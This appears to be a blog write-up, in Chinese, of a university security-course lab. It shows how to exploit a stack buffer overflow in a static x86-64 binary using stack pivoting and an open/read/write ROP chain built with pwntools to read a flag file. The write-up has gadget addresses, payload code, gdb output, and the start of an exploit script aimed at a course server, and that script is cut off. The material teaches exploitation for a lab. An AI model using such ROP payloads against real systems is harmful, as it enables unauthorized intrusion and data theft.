<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content='
  Simple PWN 0x35(2023 Lab - Stack Pivot)
  #


  Background
  #

Simple PWN - 0x09(stack pivoting)
Simple PWN - 0x10(seccomp/Lab - rop2win)

  Source code
  #

#include <stdio.h>
#include <unistd.h>

int main(void)
{
	char buf[0x20];
	read(0, buf, 0x80);
	return 0;
}

  Recon
  #

這一題助教是預設我們必須要使用stack pivot的技巧拿到flag，不過沒有時間設定seccomp，所以我們自己假裝只能使用read / write / open這三個syscall

checksec + file
$ checksec chal
[*] &#39;/mnt/d/NTU/Second Year/Computer Security/PWN/Lab2/lab_stack_pivot/share/chal&#39;
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
$ file chal
chal: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=26fa8e6daa97baf7a26596ea91af5703dd932327, for GNU/Linux 3.2.0, not stripped
首先可以看到該binary是statically link，所以直覺是利用ROP chain拿到shell，不過仔細看source code會發現BOF的長度顯然不太夠我們蓋成shell，所以需要用到stack pivot的技巧，控制RBP跳到其他的地方繼續寫
找gadget
leave_ret = 0x0000000000401cfc
pop_rdi_ret = 0x0000000000401832
pop_rsi_ret = 0x000000000040f01e
pop_rax_ret = 0x0000000000448d27
pop_rdx_ret = 0x000000000040173f
syscall_ret = 0x0000000000448280
這邊的重點是syscall ret這個gadget，其實他不是syscall完之後直接ret，而是在經過一些判斷才會進到ret，這個可以從gdb看出來
gef➤  x/10i 0x448280
   0x448280 <read+16>:  syscall
=> 0x448282 <read+18>:  cmp    rax,0xfffffffffffff000
   0x448288 <read+24>:  ja     0x4482e0 <read+112>
   0x44828a <read+26>:  ret
會這樣的原因是我們在ROPgadget中找不到syscall ; ret的gadget，所以助教提示可以直接從read / write這種function找，這樣syscall完了之後會很快的接到ret，這樣中間的操作才不會太影響我們蓋的rop
Construct ROP
首先，我們的流程是
==main_fn → bss_open → main_fn → bss_open → main_fn → bss_write==
會這樣的原因是我們只能寫入0x60的空間而已，所以把open / read / write分開寫，而寫完且執行完後會再跳原main_fn，這樣才能讓我們再讀取下一段的ROP payload

寫入的bss_addr和main_fn address
bss_addr_open = 0x4c2700
bss_addr_read = 0x4c2800
bss_addr_write = 0x4c2900
main_fn = 0x401ce1

先讓rbp跳到bss_open，然後ret到main_fn，接要放到bss_open的payload
trash_payload = b&#39;a&#39;*0x20
r.sendline(trash_payload + p64(bss_addr_open) + p64(main_fn))
之前的rop chain我們會把RBP一起蓋掉，但現在因為要跳到其他的地方，所以rbp的部分就跳到0x4c2700，然後ret address接main_fn
用gdb跟一下，放完的結果大概是這樣
0x00007ffc884f3670│+0x0000: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"   ← $rsp, $rsi
0x00007ffc884f3678│+0x0008: "aaaaaaaaaaaaaaaaaaaaaaaa"
0x00007ffc884f3680│+0x0010: "aaaaaaaaaaaaaaaa"
0x00007ffc884f3688│+0x0018: "aaaaaaaa"
0x00007ffc884f3690│+0x0020: 0x00000000004c2700  →  <transmem_list+0> add BYTE PTR [rax], al      ← $rbp
0x00007ffc884f3698│+0x0028: 0x0000000000401ce1  →  <main+12> lea rax, [rbp-0x20]
當main_fn執行完leave(mov rsp , rbp ; pop rbp ;)的時候，rbp就會指到==0x4c2700==，當我們ret到main_fn時，就可以再次輸入payload放到0x4c2700
觀察main_fn的assembly
gef➤  x/10i &amp;main
   0x401cd5 <main>:     endbr64
   0x401cd9 <main+4>:   push   rbp
   0x401cda <main+5>:   mov    rbp,rsp
   0x401cdd <main+8>:   sub    rsp,0x20
   0x401ce1 <main+12>:  lea    rax,[rbp-0x20]
   0x401ce5 <main+16>:  mov    edx,0x80
   0x401cea <main+21>:  mov    rsi,rax
   0x401ced <main+24>:  mov    edi,0x0
   0x401cf2 <main+29>:  call   0x448270 <read>
   0x401cf7 <main+34>:  mov    eax,0x0
從以上的code可以看得出來，我們是跳到0x401ce1，所以rbp會張出0x20的空間，也就是==0x4c2700-0x20=0x4c26e0==，然後read到的內容就會放到這邊來
寫入bss_addr_open
我們的目標是達成==fd = open("/home/chal/flag.txt", 0);==，具體payload如下
file_addr = b&#39;/home/chal/flag.txt&#39;.ljust(0x20, b&#39;\x00&#39;)
ROP_open = flat(
    # Open file
    # fd = open("/home/chal/flag.txt", 0);
    bss_addr_read,
    pop_rax_ret,    2,
    pop_rdi_ret,    bss_addr_open - 0x20,
    pop_rsi_ret,    0,
    pop_rdx_ret,    0,
    syscall_ret,
    main_fn
)
r.sendline(file_addr + ROP_open)
首先原本的0x20就拿來放檔案的位址，不過為甚麼後面還要再接著bss_addr_write呢?就和上面一樣，我們要寫別的rop payload上去，因為原本的位子不夠寫了，所以syscall_ret後接到main_fn，他會讀取我們寫入的rop payload到bss_addr_read的地方
寫入bss_addr_read
我們要達成的目標是==read(fd, buf, 0x30)==，具體payload如下
ROP_read = flat(
    # Read the file
    # read(fd, buf, 0x30);
    bss_addr_write,
    pop_rax_ret, 0,
    pop_rdi_ret, 3, 
    pop_rsi_ret, bss_addr_read,
    pop_rdx_ret, 0x30,
    syscall_ret,
    main_fn
)
r.sendline(file_addr + ROP_read)

寫入bss_addr_write
我們要達成的目標是==write(fd, buf, 0x30)==，具體payload如下
ROP_write = flat(
    # Write the file
    # write(1, buf, 0x30);
    bss_addr_write,
    pop_rax_ret, 1,
    pop_rdi_ret, 1,
    pop_rsi_ret, bss_addr_read,
    pop_rdx_ret, 0x30,
    syscall_ret,
    0
)
r.sendline(file_addr + ROP_write)




:::danger
執行的時候如果遇到local端可以run但server爛掉的情況，有可能是raw_input()造成的，可以先註解掉這些東西，如果還是遇到一樣的問題，可以開docker在裡面執行'><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x352023-lab---stack-pivot/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="Simple PWN 0x35(2023 Lab - Stack Pivot)"><meta property="og:description" content='Simple PWN 0x35(2023 Lab - Stack Pivot) # Background # Simple PWN - 0x09(stack pivoting) Simple PWN - 0x10(seccomp/Lab - rop2win)
Source code # #include <stdio.h> #include <unistd.h> int main(void) { char buf[0x20]; read(0, buf, 0x80); return 0; } Recon # 這一題助教是預設我們必須要使用stack pivot的技巧拿到flag，不過沒有時間設定seccomp，所以我們自己假裝只能使用read / write / open這三個syscall
checksec + file $ checksec chal [*] &#39;/mnt/d/NTU/Second Year/Computer Security/PWN/Lab2/lab_stack_pivot/share/chal&#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) $ file chal chal: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=26fa8e6daa97baf7a26596ea91af5703dd932327, for GNU/Linux 3.2.0, not stripped 首先可以看到該binary是statically link，所以直覺是利用ROP chain拿到shell，不過仔細看source code會發現BOF的長度顯然不太夠我們蓋成shell，所以需要用到stack pivot的技巧，控制RBP跳到其他的地方繼續寫 找gadget leave_ret = 0x0000000000401cfc pop_rdi_ret = 0x0000000000401832 pop_rsi_ret = 0x000000000040f01e pop_rax_ret = 0x0000000000448d27 pop_rdx_ret = 0x000000000040173f syscall_ret = 0x0000000000448280 這邊的重點是syscall ret這個gadget，其實他不是syscall完之後直接ret，而是在經過一些判斷才會進到ret，這個可以從gdb看出來 gef➤ x/10i 0x448280 0x448280 <read+16>: syscall => 0x448282 <read+18>: cmp rax,0xfffffffffffff000 0x448288 <read+24>: ja 0x4482e0 <read+112> 0x44828a <read+26>: ret 會這樣的原因是我們在ROPgadget中找不到syscall ; ret的gadget，所以助教提示可以直接從read / write這種function找，這樣syscall完了之後會很快的接到ret，這樣中間的操作才不會太影響我們蓋的rop Construct ROP 首先，我們的流程是 ==main_fn → bss_open → main_fn → bss_open → main_fn → bss_write== 會這樣的原因是我們只能寫入0x60的空間而已，所以把open / read / write分開寫，而寫完且執行完後會再跳原main_fn，這樣才能讓我們再讀取下一段的ROP payload 寫入的bss_addr和main_fn address bss_addr_open = 0x4c2700 bss_addr_read = 0x4c2800 bss_addr_write = 0x4c2900 main_fn = 0x401ce1 先讓rbp跳到bss_open，然後ret到main_fn，接要放到bss_open的payload trash_payload = b&#39;a&#39;*0x20 r.sendline(trash_payload + p64(bss_addr_open) + p64(main_fn)) 之前的rop chain我們會把RBP一起蓋掉，但現在因為要跳到其他的地方，所以rbp的部分就跳到0x4c2700，然後ret address接main_fn 用gdb跟一下，放完的結果大概是這樣 0x00007ffc884f3670│+0x0000: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" ← $rsp, $rsi 0x00007ffc884f3678│+0x0008: "aaaaaaaaaaaaaaaaaaaaaaaa" 0x00007ffc884f3680│+0x0010: "aaaaaaaaaaaaaaaa" 0x00007ffc884f3688│+0x0018: "aaaaaaaa" 0x00007ffc884f3690│+0x0020: 0x00000000004c2700 → <transmem_list+0> add BYTE PTR [rax], al ← $rbp 0x00007ffc884f3698│+0x0028: 0x0000000000401ce1 → <main+12> lea rax, [rbp-0x20] 當main_fn執行完leave(mov rsp , rbp ; pop rbp ;)的時候，rbp就會指到==0x4c2700==，當我們ret到main_fn時，就可以再次輸入payload放到0x4c2700 觀察main_fn的assembly gef➤ x/10i &amp;main 0x401cd5 <main>: endbr64 0x401cd9 <main+4>: push rbp 0x401cda <main+5>: mov rbp,rsp 0x401cdd <main+8>: sub rsp,0x20 0x401ce1 <main+12>: lea rax,[rbp-0x20] 0x401ce5 <main+16>: mov edx,0x80 0x401cea <main+21>: mov rsi,rax 0x401ced <main+24>: mov edi,0x0 0x401cf2 <main+29>: call 0x448270 <read> 0x401cf7 <main+34>: mov eax,0x0 從以上的code可以看得出來，我們是跳到0x401ce1，所以rbp會張出0x20的空間，也就是==0x4c2700-0x20=0x4c26e0==，然後read到的內容就會放到這邊來 寫入bss_addr_open 我們的目標是達成==fd = open("/home/chal/flag.txt", 0);==，具體payload如下 file_addr = b&#39;/home/chal/flag.txt&#39;.ljust(0x20, b&#39;\x00&#39;) ROP_open = flat( # Open file # fd = open("/home/chal/flag.txt", 0); bss_addr_read, pop_rax_ret, 2, pop_rdi_ret, bss_addr_open - 0x20, pop_rsi_ret, 0, pop_rdx_ret, 0, syscall_ret, main_fn ) r.sendline(file_addr + ROP_open) 首先原本的0x20就拿來放檔案的位址，不過為甚麼後面還要再接著bss_addr_write呢?就和上面一樣，我們要寫別的rop payload上去，因為原本的位子不夠寫了，所以syscall_ret後接到main_fn，他會讀取我們寫入的rop payload到bss_addr_read的地方 寫入bss_addr_read 我們要達成的目標是==read(fd, buf, 0x30)==，具體payload如下 ROP_read = flat( # Read the file # read(fd, buf, 0x30); bss_addr_write, pop_rax_ret, 0, pop_rdi_ret, 3, pop_rsi_ret, bss_addr_read, pop_rdx_ret, 0x30, syscall_ret, main_fn ) r.sendline(file_addr + ROP_read) 寫入bss_addr_write 我們要達成的目標是==write(fd, buf, 0x30)==，具體payload如下 ROP_write = flat( # Write the file # write(1, buf, 0x30); bss_addr_write, pop_rax_ret, 1, pop_rdi_ret, 1, pop_rsi_ret, bss_addr_read, pop_rdx_ret, 0x30, syscall_ret, 0 ) r.sendline(file_addr + ROP_write) :::danger 執行的時候如果遇到local端可以run但server爛掉的情況，有可能是raw_input()造成的，可以先註解掉這些東西，如果還是遇到一樣的問題，可以開docker在裡面執行'><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="security"><meta property="article:tag" content="Eductf"><meta property="article:tag" content="CTF"><meta property="article:tag" content="PWN"><title>Simple PWN 0x35(2023 Lab - Stack Pivot) | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x352023-lab---stack-pivot/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>Simple PWN 0x35(2023 Lab - Stack Pivot)</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#background>Background</a></li><li><a href=#source-code>Source code</a></li><li><a href=#recon>Recon</a></li><li><a href=#exploit---ropchain--stack-pivot>Exploit - ROPchain + stack pivot</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=simple-pwn-0x352023-lab---stack-pivot>Simple PWN 0x35(2023 Lab - Stack Pivot)
<a class=anchor href=#simple-pwn-0x352023-lab---stack-pivot>#</a></h1><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><p><a href=https://hackmd.io/@SBK6401/rylybxgji>Simple PWN - 0x09(stack pivoting)</a>
<a href=https://hackmd.io/@SBK6401/H1NX6Bloj>Simple PWN - 0x10(seccomp/Lab - rop2win)</a></p><h2 id=source-code>Source code
<a class=anchor href=#source-code>#</a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>void</span>)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>char</span> buf[<span style=color:#ae81ff>0x20</span>];
</span></span><span style=display:flex><span>	read(<span style=color:#ae81ff>0</span>, buf, <span style=color:#ae81ff>0x80</span>);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h2 id=recon>Recon
<a class=anchor href=#recon>#</a></h2><p>這一題助教是預設我們必須要使用stack pivot的技巧拿到flag，不過沒有時間設定seccomp，所以我們自己假裝只能使用read / write / open這三個syscall</p><ol><li>checksec + file<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ checksec chal
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> <span style=color:#e6db74>&#39;/mnt/d/NTU/Second Year/Computer Security/PWN/Lab2/lab_stack_pivot/share/chal&#39;</span>
</span></span><span style=display:flex><span>    Arch:     amd64-64-little
</span></span><span style=display:flex><span>    RELRO:    Partial RELRO
</span></span><span style=display:flex><span>    Stack:    Canary found
</span></span><span style=display:flex><span>    NX:       NX enabled
</span></span><span style=display:flex><span>    PIE:      No PIE <span style=color:#f92672>(</span>0x400000<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>$ file chal
</span></span><span style=display:flex><span>chal: ELF 64-bit LSB executable, x86-64, version <span style=color:#ae81ff>1</span> <span style=color:#f92672>(</span>GNU/Linux<span style=color:#f92672>)</span>, statically linked, BuildID<span style=color:#f92672>[</span>sha1<span style=color:#f92672>]=</span>26fa8e6daa97baf7a26596ea91af5703dd932327, <span style=color:#66d9ef>for</span> GNU/Linux 3.2.0, not stripped
</span></span></code></pre></div>首先可以看到該binary是statically link，所以直覺是利用ROP chain拿到shell，不過仔細看source code會發現BOF的長度顯然不太夠我們蓋成shell，所以需要用到stack pivot的技巧，控制RBP跳到其他的地方繼續寫</li><li>找gadget<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>leave_ret <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x0000000000401cfc</span>
</span></span><span style=display:flex><span>pop_rdi_ret <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x0000000000401832</span>
</span></span><span style=display:flex><span>pop_rsi_ret <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x000000000040f01e</span>
</span></span><span style=display:flex><span>pop_rax_ret <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x0000000000448d27</span>
</span></span><span style=display:flex><span>pop_rdx_ret <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x000000000040173f</span>
</span></span><span style=display:flex><span>syscall_ret <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x0000000000448280</span>
</span></span></code></pre></div>這邊的重點是syscall ret這個gadget，其實他不是syscall完之後直接ret，而是在經過一些判斷才會進到ret，這個可以從gdb看出來<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>gef➤  x/10i 0x448280
</span></span><span style=display:flex><span>   0x448280 &lt;read+16&gt;:  syscall
</span></span><span style=display:flex><span><span style=color:#f92672>=</span>&gt; 0x448282 &lt;read+18&gt;:  cmp    rax,0xfffffffffffff000
</span></span><span style=display:flex><span>   0x448288 &lt;read+24&gt;:  ja     0x4482e0 &lt;read+112&gt;
</span></span><span style=display:flex><span>   0x44828a &lt;read+26&gt;:  ret
</span></span></code></pre></div>會這樣的原因是我們在ROPgadget中找不到<code>syscall ; ret</code>的gadget，所以助教提示可以直接從read / write這種function找，這樣syscall完了之後會很快的接到ret，這樣中間的操作才不會太影響我們蓋的rop</li><li>Construct ROP
首先，我們的流程是
==main_fn → bss_open → main_fn → bss_open → main_fn → bss_write==
會這樣的原因是我們只能寫入0x60的空間而已，所以把open / read / write分開寫，而寫完且執行完後會再跳原main_fn，這樣才能讓我們再讀取下一段的ROP payload<ol><li>寫入的bss_addr和main_fn address<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>bss_addr_open <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x4c2700</span>
</span></span><span style=display:flex><span>bss_addr_read <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x4c2800</span>
</span></span><span style=display:flex><span>bss_addr_write <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x4c2900</span>
</span></span><span style=display:flex><span>main_fn <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x401ce1</span>
</span></span></code></pre></div></li><li>先讓rbp跳到bss_open，然後ret到main_fn，接要放到bss_open的payload<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>trash_payload <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>0x20</span>
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendline(trash_payload <span style=color:#f92672>+</span> p64(bss_addr_open) <span style=color:#f92672>+</span> p64(main_fn))
</span></span></code></pre></div>之前的rop chain我們會把RBP一起蓋掉，但現在因為要跳到其他的地方，所以rbp的部分就跳到<code>0x4c2700</code>，然後ret address接main_fn
用gdb跟一下，放完的結果大概是這樣<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>0x00007ffc884f3670│+0x0000: <span style=color:#e6db74>&#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#34;</span>   ← $rsp, $rsi
</span></span><span style=display:flex><span>0x00007ffc884f3678│+0x0008: <span style=color:#e6db74>&#34;aaaaaaaaaaaaaaaaaaaaaaaa&#34;</span>
</span></span><span style=display:flex><span>0x00007ffc884f3680│+0x0010: <span style=color:#e6db74>&#34;aaaaaaaaaaaaaaaa&#34;</span>
</span></span><span style=display:flex><span>0x00007ffc884f3688│+0x0018: <span style=color:#e6db74>&#34;aaaaaaaa&#34;</span>
</span></span><span style=display:flex><span>0x00007ffc884f3690│+0x0020: 0x00000000004c2700  →  &lt;transmem_list+0&gt; add BYTE PTR <span style=color:#f92672>[</span>rax<span style=color:#f92672>]</span>, al      ← $rbp
</span></span><span style=display:flex><span>0x00007ffc884f3698│+0x0028: 0x0000000000401ce1  →  &lt;main+12&gt; lea rax, <span style=color:#f92672>[</span>rbp-0x20<span style=color:#f92672>]</span>
</span></span></code></pre></div>當main_fn執行完leave(<code>mov rsp , rbp ; pop rbp ;</code>)的時候，rbp就會指到==0x4c2700==，當我們ret到main_fn時，就可以再次輸入payload放到0x4c2700</li><li>觀察main_fn的assembly<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>gef➤  x/10i &amp;main
</span></span><span style=display:flex><span>   0x401cd5 &lt;main&gt;:     endbr64
</span></span><span style=display:flex><span>   0x401cd9 &lt;main+4&gt;:   push   rbp
</span></span><span style=display:flex><span>   0x401cda &lt;main+5&gt;:   mov    rbp,rsp
</span></span><span style=display:flex><span>   0x401cdd &lt;main+8&gt;:   sub    rsp,0x20
</span></span><span style=display:flex><span>   0x401ce1 &lt;main+12&gt;:  lea    rax,<span style=color:#f92672>[</span>rbp-0x20<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>   0x401ce5 &lt;main+16&gt;:  mov    edx,0x80
</span></span><span style=display:flex><span>   0x401cea &lt;main+21&gt;:  mov    rsi,rax
</span></span><span style=display:flex><span>   0x401ced &lt;main+24&gt;:  mov    edi,0x0
</span></span><span style=display:flex><span>   0x401cf2 &lt;main+29&gt;:  call   0x448270 &lt;read&gt;
</span></span><span style=display:flex><span>   0x401cf7 &lt;main+34&gt;:  mov    eax,0x0
</span></span></code></pre></div>從以上的code可以看得出來，我們是跳到0x401ce1，所以rbp會張出0x20的空間，也就是==0x4c2700-0x20=0x4c26e0==，然後read到的內容就會放到這邊來</li><li>寫入bss_addr_open
我們的目標是達成==fd = open("/home/chal/flag.txt", 0);==，具體payload如下<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>file_addr <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;/home/chal/flag.txt&#39;</span><span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>0x20</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>ROP_open <span style=color:#f92672>=</span> flat(
</span></span><span style=display:flex><span>    <span style=color:#75715e># Open file</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># fd = open(&#34;/home/chal/flag.txt&#34;, 0);</span>
</span></span><span style=display:flex><span>    bss_addr_read,
</span></span><span style=display:flex><span>    pop_rax_ret,    <span style=color:#ae81ff>2</span>,
</span></span><span style=display:flex><span>    pop_rdi_ret,    bss_addr_open <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x20</span>,
</span></span><span style=display:flex><span>    pop_rsi_ret,    <span style=color:#ae81ff>0</span>,
</span></span><span style=display:flex><span>    pop_rdx_ret,    <span style=color:#ae81ff>0</span>,
</span></span><span style=display:flex><span>    syscall_ret,
</span></span><span style=display:flex><span>    main_fn
</span></span><span style=display:flex><span>)
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendline(file_addr <span style=color:#f92672>+</span> ROP_open)
</span></span></code></pre></div>首先原本的0x20就拿來放檔案的位址，不過為甚麼後面還要再接著bss_addr_write呢?就和上面一樣，我們要寫別的rop payload上去，因為原本的位子不夠寫了，所以syscall_ret後接到main_fn，他會讀取我們寫入的rop payload到bss_addr_read的地方</li><li>寫入bss_addr_read
我們要達成的目標是==read(fd, buf, 0x30)==，具體payload如下<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>ROP_read <span style=color:#f92672>=</span> flat(
</span></span><span style=display:flex><span>    <span style=color:#75715e># Read the file</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># read(fd, buf, 0x30);</span>
</span></span><span style=display:flex><span>    bss_addr_write,
</span></span><span style=display:flex><span>    pop_rax_ret, <span style=color:#ae81ff>0</span>,
</span></span><span style=display:flex><span>    pop_rdi_ret, <span style=color:#ae81ff>3</span>, 
</span></span><span style=display:flex><span>    pop_rsi_ret, bss_addr_read,
</span></span><span style=display:flex><span>    pop_rdx_ret, <span style=color:#ae81ff>0x30</span>,
</span></span><span style=display:flex><span>    syscall_ret,
</span></span><span style=display:flex><span>    main_fn
</span></span><span style=display:flex><span>)
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendline(file_addr <span style=color:#f92672>+</span> ROP_read)
</span></span></code></pre></div></li><li>寫入bss_addr_write
我們要達成的目標是==write(fd, buf, 0x30)==，具體payload如下<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>ROP_write <span style=color:#f92672>=</span> flat(
</span></span><span style=display:flex><span>    <span style=color:#75715e># Write the file</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># write(1, buf, 0x30);</span>
</span></span><span style=display:flex><span>    bss_addr_write,
</span></span><span style=display:flex><span>    pop_rax_ret, <span style=color:#ae81ff>1</span>,
</span></span><span style=display:flex><span>    pop_rdi_ret, <span style=color:#ae81ff>1</span>,
</span></span><span style=display:flex><span>    pop_rsi_ret, bss_addr_read,
</span></span><span style=display:flex><span>    pop_rdx_ret, <span style=color:#ae81ff>0x30</span>,
</span></span><span style=display:flex><span>    syscall_ret,
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>)
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendline(file_addr <span style=color:#f92672>+</span> ROP_write)
</span></span></code></pre></div></li></ol></li></ol><p>:::danger
執行的時候如果遇到local端可以run但server爛掉的情況，有可能是raw_input()造成的，可以先註解掉這些東西，如果還是遇到一樣的問題，可以開docker在裡面執行</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ docker-compose up -d
</span></span><span style=display:flex><span>$ docker ps
</span></span><span style=display:flex><span>$ docker exec -it <span style=color:#f92672>{</span>container name<span style=color:#f92672>}</span> /bin/bash
</span></span><span style=display:flex><span>&gt; apt update; apt upgrade -y; apt install curl binutils vim git gdb python3 python3-pip -y
</span></span><span style=display:flex><span>&gt; pip install pwntools -y
</span></span><span style=display:flex><span>&gt; python3 exp.py
</span></span></code></pre></div><p>:::</p><h2 id=exploit---ropchain--stack-pivot>Exploit - ROPchain + stack pivot
<a class=anchor href=#exploit---ropchain--stack-pivot>#</a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>arch <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;amd64&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># r = process(&#39;./chal&#39;)</span>
</span></span><span style=display:flex><span>r <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#39;10.113.184.121&#39;</span>, <span style=color:#ae81ff>10054</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>leave_ret <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x0000000000401cfc</span>
</span></span><span style=display:flex><span>pop_rdi_ret <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x0000000000401832</span>
